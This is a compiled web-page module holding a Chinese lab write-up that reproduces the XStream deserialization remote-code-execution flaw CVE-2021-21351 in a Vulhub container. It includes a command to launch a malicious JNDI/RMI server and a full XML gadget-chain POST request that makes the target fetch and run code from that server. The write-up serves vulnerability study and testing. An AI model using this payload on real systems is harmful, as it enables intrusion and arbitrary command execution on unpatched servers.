import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as r,c as d,a as e,b as t,d as l,e as i}from"./app-58e4a7d6.js";const c={},o=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),t(" 漏洞描述")],-1),m=e("p",null,"XStream 是一个轻量级、简单易用的开源 Java 类库，它主要用于将对象序列化成 XML（JSON）或反序列化为对象。",-1),v=e("p",null,[t("XStream 在解析 XML 文本时使用黑名单机制来防御反序列化漏洞，但是其 1.4.15 及之前版本黑名单存在缺陷，攻击者可利用 "),e("code",null,"javax.naming.ldap.Rdn$RdnEntry"),t(" 及 "),e("code",null,"javax.sql.rowset.BaseRowSet"),t(" 构造 JNDI 注入，进而执行任意命令。")],-1),g=e("p",null,"参考链接：",-1),u={href:"https://x-stream.github.io/CVE-2021-21351.html",target:"_blank",rel:"noopener noreferrer"},_={href:"https://paper.seebug.org/1543/",target:"_blank",rel:"noopener noreferrer"},b={href:"https://www.veracode.com/blog/research/exploiting-jndi-injections-java",target:"_blank",rel:"noopener noreferrer"},p={href:"https://github.com/welk1n/JNDI-Injection-Exploit/",target:"_blank",rel:"noopener noreferrer"},h=i(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个 Springboot + XStream 1.4.15 的环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，我们向 <code>http://your-ip:8080</code> 发送一个正常的 XML 数据包，将会得到预期返回：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022306230.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,6),f={href:"https://www.veracode.com/blog/research/exploiting-jndi-injections-java",target:"_blank",rel:"noopener noreferrer"},x=e("code",null,"org.apache.naming.factory.BeanFactory",-1),S={href:"https://github.com/welk1n/JNDI-Injection-Exploit/",target:"_blank",rel:"noopener noreferrer"},w=i(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;touch /tmp/awesome_poc&quot; -A 192.168.174.128
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022309839.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>根据 Java 版本，使用上图中基于 SpringBoot 利用链的 RMI 地址作为 <code>&lt;dataSource&gt;</code> 的值，构造 POC 如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST / HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/xml
Content-Length: 3184

&lt;sorted-set&gt;
  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
    &lt;type&gt;ysomap&lt;/type&gt;
    &lt;value class=&#39;com.sun.org.apache.xpath.internal.objects.XRTreeFrag&#39;&gt;
      &lt;m__DTMXRTreeFrag&gt;
        &lt;m__dtm class=&#39;com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM&#39;&gt;
          &lt;m__size&gt;-10086&lt;/m__size&gt;
          &lt;m__mgrDefault&gt;
            &lt;__overrideDefaultParser&gt;false&lt;/__overrideDefaultParser&gt;
            &lt;m__incremental&gt;false&lt;/m__incremental&gt;
            &lt;m__source__location&gt;false&lt;/m__source__location&gt;
            &lt;m__dtms&gt;
              &lt;null/&gt;
            &lt;/m__dtms&gt;
            &lt;m__defaultHandler/&gt;
          &lt;/m__mgrDefault&gt;
          &lt;m__shouldStripWS&gt;false&lt;/m__shouldStripWS&gt;
          &lt;m__indexing&gt;false&lt;/m__indexing&gt;
          &lt;m__incrementalSAXSource class=&#39;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&#39;&gt;
            &lt;fPullParserConfig class=&#39;com.sun.rowset.JdbcRowSetImpl&#39; serialization=&#39;custom&#39;&gt;
              &lt;javax.sql.rowset.BaseRowSet&gt;
                &lt;default&gt;
                  &lt;concurrency&gt;1008&lt;/concurrency&gt;
                  &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;
                  &lt;fetchDir&gt;1000&lt;/fetchDir&gt;
                  &lt;fetchSize&gt;0&lt;/fetchSize&gt;
                  &lt;isolation&gt;2&lt;/isolation&gt;
                  &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;
                  &lt;maxRows&gt;0&lt;/maxRows&gt;
                  &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;
                  &lt;readOnly&gt;true&lt;/readOnly&gt;
                  &lt;rowSetType&gt;1004&lt;/rowSetType&gt;
                  &lt;showDeleted&gt;false&lt;/showDeleted&gt;
                  &lt;dataSource&gt;rmi://192.168.174.128:1099/tznmqn&lt;/dataSource&gt;
                  &lt;listeners/&gt;
                  &lt;params/&gt;
                &lt;/default&gt;
              &lt;/javax.sql.rowset.BaseRowSet&gt;
              &lt;com.sun.rowset.JdbcRowSetImpl&gt;
                &lt;default/&gt;
              &lt;/com.sun.rowset.JdbcRowSetImpl&gt;
            &lt;/fPullParserConfig&gt;
            &lt;fConfigSetInput&gt;
              &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt;
              &lt;name&gt;setAutoCommit&lt;/name&gt;
              &lt;parameter-types&gt;
                &lt;class&gt;boolean&lt;/class&gt;
              &lt;/parameter-types&gt;
            &lt;/fConfigSetInput&gt;
            &lt;fConfigParse reference=&#39;../fConfigSetInput&#39;/&gt;
            &lt;fParseInProgress&gt;false&lt;/fParseInProgress&gt;
          &lt;/m__incrementalSAXSource&gt;
          &lt;m__walker&gt;
            &lt;nextIsRaw&gt;false&lt;/nextIsRaw&gt;
          &lt;/m__walker&gt;
          &lt;m__endDocumentOccured&gt;false&lt;/m__endDocumentOccured&gt;
          &lt;m__idAttributes/&gt;
          &lt;m__textPendingStart&gt;-1&lt;/m__textPendingStart&gt;
          &lt;m__useSourceLocationProperty&gt;false&lt;/m__useSourceLocationProperty&gt;
          &lt;m__pastFirstElement&gt;false&lt;/m__pastFirstElement&gt;
        &lt;/m__dtm&gt;
        &lt;m__dtmIdentity&gt;1&lt;/m__dtmIdentity&gt;
      &lt;/m__DTMXRTreeFrag&gt;
      &lt;m__dtmRoot&gt;1&lt;/m__dtmRoot&gt;
      &lt;m__allowRelease&gt;false&lt;/m__allowRelease&gt;
    &lt;/value&gt;
  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
    &lt;type&gt;ysomap&lt;/type&gt;
    &lt;value class=&#39;com.sun.org.apache.xpath.internal.objects.XString&#39;&gt;
      &lt;m__obj class=&#39;string&#39;&gt;test&lt;/m__obj&gt;
    &lt;/value&gt;
  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
&lt;/sorted-set&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中，evil-ip 是恶意 RMI 服务器的地址。然后，进入目标容器内，可见 <code>touch /tmp/awesome_poc</code> 已成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203022311937.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在实战中，如果目标 Java 版本较低，POC 需要做修改，将其中的 <code>&lt;__overrideDefaultParser&gt;false&lt;/__overrideDefaultParser&gt;</code> 改成 <code>&lt;__useServicesMechanism&gt;false&lt;/__useServicesMechanism&gt;</code> 即可。</p>`,7);function y(R,j){const n=s("ExternalLinkIcon");return r(),d("div",null,[o,m,v,g,e("ul",null,[e("li",null,[e("a",u,[t("https://x-stream.github.io/CVE-2021-21351.html"),l(n)])]),e("li",null,[e("a",_,[t("https://paper.seebug.org/1543/"),l(n)])]),e("li",null,[e("a",b,[t("https://www.veracode.com/blog/research/exploiting-jndi-injections-java"),l(n)])]),e("li",null,[e("a",p,[t("https://github.com/welk1n/JNDI-Injection-Exploit/"),l(n)])])]),h,e("p",null,[t("由于目标环境 Java 版本高于 8u191，故我们需要借助 "),e("a",f,[t("这篇文章"),l(n)]),t(" 中给出的方法，使用 "),x,t(" 加 EL 表达式注入的方式来执行任意命令。")]),e("p",null,[t("使用 "),e("a",S,[t("这个工具"),l(n)]),t(" 启动恶意 JNDI 服务器：")]),w])}const P=a(c,[["render",y],["__file","XStream 反序列化命令执行漏洞 CVE-2021-21351.html.vue"]]);export{P as default};
